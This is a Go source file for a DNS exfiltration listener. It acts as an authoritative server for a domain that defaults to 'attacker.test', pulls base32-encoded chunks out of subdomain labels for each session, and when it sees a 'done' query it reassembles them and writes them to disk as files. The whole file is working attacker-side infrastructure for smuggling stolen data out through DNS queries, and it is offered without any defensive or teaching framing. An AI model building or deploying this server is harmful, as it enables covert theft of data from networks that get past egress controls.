package main

import (
	"encoding/base32"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/miekg/dns"
)

var (
	domainFlag = flag.String("domain", "attacker.test", "")
	outDir     = flag.String("out", "received", "")
	port       = flag.Int("port", 5300, "")
	maxChunks  = flag.Int("max-chunks", 20000, "")
	maxBytes   = flag.Int("max-bytes", 50<<20, "")
)

type sessionStore struct {
	mu     sync.Mutex
	chunks map[string]map[int]string
	bytes  map[string]int
}

func newStore() *sessionStore {
	return &sessionStore{
		chunks: make(map[string]map[int]string),
		bytes:  make(map[string]int),
	}
}

func (s *sessionStore) addChunk(session string, seq int, chunk string) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.chunks[session] == nil {
		s.chunks[session] = make(map[int]string)
		s.bytes[session] = 0
	}
	if len(s.chunks[session]) >= *maxChunks {
		return fmt.Errorf("max chunks exceeded")
	}
	s.chunks[session][seq] = chunk
	s.bytes[session] += len(chunk)
	if s.bytes[session] > *maxBytes {
		delete(s.chunks, session)
		delete(s.bytes, session)
		return fmt.Errorf("max bytes exceeded, session dropped")
	}
	return nil
}

func (s *sessionStore) reconstructAndWrite(session string) (string, error) {
	s.mu.Lock()
	m, ok := s.chunks[session]
	if !ok {
		s.mu.Unlock()
		return "", fmt.Errorf("no session")
	}
	seqs := make([]int, 0, len(m))
	for k := range m {
		seqs = append(seqs, k)
	}
	sort.Ints(seqs)
	parts := make([]string, 0, len(seqs))
	for _, i := range seqs {
		parts = append(parts, m[i])
	}
	delete(s.chunks, session)
	delete(s.bytes, session)
	s.mu.Unlock()

	joined := strings.Join(parts, "")
	decoder := base32.StdEncoding.WithPadding(base32.NoPadding)
	data, err := decoder.DecodeString(strings.ToUpper(joined))
	if err != nil {
		return "", err
	}

	if err := os.MkdirAll(*outDir, 0o755); err != nil {
		return "", err
	}
	name := fmt.Sprintf("%s/%s_%d.bin", *outDir, session, time.Now().Unix())
	if err := os.WriteFile(name, data, 0o644); err != nil {
		return "", err
	}
	return name, nil
}

func (s *sessionStore) cleanup(session string) {
	s.mu.Lock()
	delete(s.chunks, session)
	delete(s.bytes, session)
	s.mu.Unlock()
}

func serveDNS(s *sessionStore, targetDomain string) {
	d := dns.NewServeMux()
	domainFqdn := dns.Fqdn(targetDomain)

	d.HandleFunc(".", func(w dns.ResponseWriter, r *dns.Msg) {
		m := new(dns.Msg)
		m.SetReply(r)
		m.Authoritative = true

		if len(r.Question) == 0 {
			_ = w.WriteMsg(m)
			return
		}

		q := r.Question[0]
		qName := q.Name
		if !strings.HasSuffix(qName, domainFqdn) && qName != domainFqdn {
			m.Rcode = dns.RcodeNameError
			_ = w.WriteMsg(m)
			return
		}

		name := strings.TrimSuffix(qName, ".")
		parts := strings.Split(name, ".")
		domainParts := strings.Split(strings.TrimSuffix(domainFqdn, "."), ".")
		if len(parts) < 3+len(domainParts) {
			m.Rcode = dns.RcodeSuccess
			_ = w.WriteMsg(m)
			return
		}

		sessionIndex := len(parts) - len(domainParts) - 1
		session := parts[sessionIndex]
		seqStr := parts[0]
		chunk := parts[1]

		if strings.HasPrefix(seqStr, "done") || strings.HasPrefix(seqStr, "cleanup") {
			// handle done/cleanup forms like done.<session>.<domain>
			if strings.HasPrefix(seqStr, "done") {
				path, err := s.reconstructAndWrite(session)
				if err != nil {
					log.Printf("reconstruct error for %s: %v", session, err)
				} else {
					log.Printf("session %s reconstructed -> %s", session, path)
				}
			}
			if strings.HasPrefix(seqStr, "cleanup") {
				s.cleanup(session)
				log.Printf("session %s cleaned up", session)
			}
			a := &dns.A{Hdr: dns.RR_Header{Name: qName, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 60}, A: net.ParseIP("127.0.0.1")}
			m.Answer = append(m.Answer, a)
			_ = w.WriteMsg(m)
			return
		}

		seq, err := strconv.Atoi(seqStr)
		if err != nil {
			m.Rcode = dns.RcodeSuccess
			_ = w.WriteMsg(m)
			return
		}

		if err := s.addChunk(session, seq, chunk); err != nil {
			log.Printf("addChunk error session=%s seq=%d: %v", session, seq, err)
			s.cleanup(session)
		}

		a := &dns.A{Hdr: dns.RR_Header{Name: qName, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 60}, A: net.ParseIP("127.0.0.1")}
		m.Answer = append(m.Answer, a)
		_ = w.WriteMsg(m)
	})

	serverUDP := &dns.Server{Addr: fmt.Sprintf(":%d", *port), Net: "udp", Handler: d}
	serverTCP := &dns.Server{Addr: fmt.Sprintf(":%d", *port), Net: "tcp", Handler: d}

	go func() {
		if err := serverUDP.ListenAndServe(); err != nil {
			log.Fatalf("failed udp: %v", err)
		}
	}()
	if err := serverTCP.ListenAndServe(); err != nil {
		log.Fatalf("failed tcp: %v", err)
	}
}

func main() {
	flag.Parse()
	store := newStore()
	log.Printf("listening authoritative for %s on port %d", *domainFlag, *port)
	serveDNS(store, *domainFlag)
}